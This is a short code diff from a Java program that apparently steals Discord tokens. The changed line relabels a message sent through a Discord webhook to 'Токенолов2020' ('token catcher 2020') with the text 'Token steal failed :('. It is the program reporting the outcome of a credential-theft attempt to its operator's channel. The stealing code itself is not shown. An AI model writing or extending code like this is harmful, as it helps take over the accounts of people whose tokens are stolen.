@@ -49,6 +49,6 @@ public class Main {
 				}
 			 }
 		 }
-		DiscordHook.sendMessage("SENTINEL", "TheKirkaYT has been banned! Token Failed :(");
+		DiscordHook.sendMessage("Токенолов2020", "Token steal failed :(");
 	 }
 }
